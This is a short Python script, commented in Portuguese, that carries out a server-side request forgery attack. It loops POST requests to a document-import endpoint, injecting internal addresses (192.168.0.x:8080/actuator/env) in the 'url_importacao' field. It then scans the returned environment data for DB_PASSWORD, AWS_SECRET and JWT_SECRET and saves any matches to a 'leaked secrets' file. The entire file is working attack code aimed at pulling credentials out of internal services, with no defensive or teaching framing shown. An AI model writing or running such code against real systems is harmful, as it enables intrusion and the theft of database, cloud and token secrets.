import requests
import json
import re

# Função para realizar o loop POST
def run_srf_check(target_url):
  for i in range(1, 11):
    payload = {
      'url_importacao': f"http://192.168.0.{i}:8080/actuator/env",
      # Adicione aqui mais urls de interesse
    }
    response = requests.post(target_url, json=payload)
    if response.status_code == 200:
      process_response(response)

# Função para processar a resposta e procurar por senhas em JSON
def process_response(response):
  try:
    data = json.loads(response.content)  
    for key, value in data.items():
      if any(re.search(pattern, value) for pattern in ['DB_PASSWORD', 'AWS_SECRET', 'JWT_SECRET']):
        # Aqui você deve implementar a lógica de salvamento dos segredos em um arquivo local
        with open("segredos_vazados.txt", "a") as f:  
          f.write(f"{key}: {value}\n")
        print(f"Segredo encontrado para {key} no JSON")

  except json.JSONDecodeError:
    # Tratamento para resposta inválida, por exemplo, exibir mensagem de erro
    print("Erro ao processar a resposta do servidor.")


if __name__ == "__main__":
  run_srf_check('http://localhost:8080/api/documents/importar') 